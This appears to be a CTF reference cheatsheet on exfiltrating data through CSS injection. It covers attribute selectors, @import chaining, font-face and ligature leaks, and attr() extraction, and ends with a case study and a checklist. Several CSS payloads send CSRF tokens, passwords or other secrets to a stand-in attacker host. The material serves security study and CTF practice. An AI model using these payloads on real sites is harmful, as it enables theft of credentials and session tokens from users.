# CSS injection & exfiltration (out-of-band)

Use when: you have CSS/HTML injection but JS is blocked (CSP), OR you need to leak
text/attributes from a page you don't control (a bot/admin view). CSS exfil turns a
style injection into a data channel.

## Local full cheatsheets (mirrored on this host)
- /root/prime/ctf/references/hacktricks-legacy/  (full HackTricks markdown, 2011 files)
- /root/prime/ctf/references/payloadsallthethings/  (full PayloadsAllTheThings)
  - 'CSS Injection/' (this page), 'XS-Leak/', 'XSS Injection/', 'SSRF/' etc.
Search them with: `grep -ri "<term>" /root/prime/ctf/references/`

## Identify the sink and what survives
- `<style>` and `<svg><style>` survive DOMPurify by DEFAULT (FORBID_TAGS:['style'] blocks).
- `style` attribute (needs style-src 'unsafe-inline'); LESS/Sass `@import (inline)` = file read.
- Profile fields (about/experience/education), message bodies, names.

## Technique 1 — attribute-selector exfil (classic, for INPUT[value]/attrs)
```css
input[name=csrf][value^="a"] { background: url(//attacker/?c=a) }
input[name=csrf][value^="b"] { background: url(//attacker/?c=b) }
```
- Selectors: `^=` prefix, `$=` suffix, `*=` substring.
- Hidden input: can't style it directly -> sibling selector `input[value^=a] + input { background:url(...) }`, or `:has()`: `div:has(input[value="1337"]){ background:url(/c?1337) }`.
- Concurrency: prefix on `background`, suffix on `list-style-image`/`border-image` simultaneously.

## Technique 2 — Sequential @import chaining (SIC / Blind CSS Exfil)
1. Inject `@import url(//attacker/start)`.
2. Attacker holds the connection (long-poll) and serves the next stylesheet.
3. A matching attribute selector fires a background request; the attacker then serves the
   next `@import` continuing the prefix, without reloading the page.
- Tools: https://github.com/hackvertor/blind-css-exfiltration, https://github.com/d0nutptr/sic
- Full runnable server in hacktricks-legacy/src/pentesting-web/xs-search/css-injection/css-injection-code.md

## Technique 3 — @font-face unicode-range (char presence)
```css
@font-face{font-family:p;src:url(//attacker/?A);unicode-range:U+0041;}
#secret{font-family:p;}
```
Font fetched only if the char is present. Cannot distinguish repeats or order. Reliable presence oracle.

## Technique 4 — Fontleak / ligatures (leaks TEXT NODES + inline <script> content)
- Mechanism: custom font where every glyph is zero-width; OpenType `liga` substitutions
  consume chars after a known prefix; each candidate char -> distinct glyph width; measure
  width via `@container (width:Npx)` or `anchor-size()`; fire `background:url(//attacker/?c=...)`.
- Force target to render as text: `script{display:block}` / `*{display:none}` then re-show target.
- Tool: https://github.com/adrgs/fontleak (docker: `ghcr.io/adrgs/fontleak`), selector must match EXACTLY one element.
- Writeup: https://adragos.ro/fontleak/ ; PortSwigger: https://portswigger.net/research/blind-css-exfiltration

## Technique 5 — attr() extraction (leaks an attribute value directly)
```css
input[name="password"] { background: image-set(attr(value)); }
```
Browser resolves the attr() value as a URL against the STYLESHEET's origin -> request
`GET /<secret>`. (Advanced attr() in Chrome 133+; see https://developer.chrome.com/blog/advanced-attr)

## Technique 6 — inline-style conditionals (style attribute only)
Chained CSS `if()` + `style()` to branch on attribute values, each branch loading a URL.
Example: https://portswigger.net/research/inline-style-exfiltration

## Technique 7 — OOB channels
- HTTP webhook (webhook.site / requestbin / own listener - must be public; the BOT fetches).
- DNS exfil via subdomain lookups when no HTTP egress.
- background/list-style-image/border-image/image-set url() are the exfil primitives.

## Tools
- blind-css-exfiltration (hackvertor), css-exfiltration (PortSwigger), sic (d0nutptr),
  css-scrollbar-attack (cgvwzq), fontleak (adrgs).

## Key references
- PortSwigger blind CSS exfil: https://portswigger.net/research/blind-css-exfiltration
- Fontleak: https://adragos.ro/fontleak/
- PAT CSS Injection: local payloadsallthethings/CSS Injection/README.md
- HackTricks css-injection-code: local hacktricks-legacy/.../css-injection-code.md
- xsleaks.dev CSS injection: https://xsleaks.dev/docs/attacks/css-injection/
- Inline style exfil: https://portswigger.net/research/inline-style-exfiltration

## TFC CTF 2026 case study — larpin / larpin2 (premium token)
- CSS injection in about/experience/education (sanitizer keeps <svg>/<style>; DOMPurify 3.4.14 keeps <svg><style>@import).
- Page loads: config <script nonce> -> <script id=viewer-premium-token> -> /js/viewer-token.js.
- Flag gated by POST /premium/activate {token} (302 on success); flag on GET /premium.
- UNbreakable original solved via Technique 4 through a report bot; the TFC port has NO report
  endpoint and NO bot -> bot-driven exfil does NOT apply. Remaining leads: token disclosure in a
  same-origin static asset / source map (grep *.js.map + all static files), or rate-limit bypass
  to brute-force /premium/activate.
- Lesson: CSS exfil needs a RENDERER (bot/victim browser). Without one, pivot to token-source
  discovery (static assets, source maps, write endpoints).

## Checklist
1. Confirm the sink (which field/element; does <style> survive the sanitizer?).
2. Is there a bot/victim view? What page does it render, whose token is in scope?
3. Secret in an attribute (T1/T5/T6) or a text node/<script> (T4)?
4. Set up the OOB listener BEFORE injecting.
5. Recover the known prefix first (e.g. `premiumToken: "`).
6. Automate the char-by-char loop (font builder + extractor + listener polling).
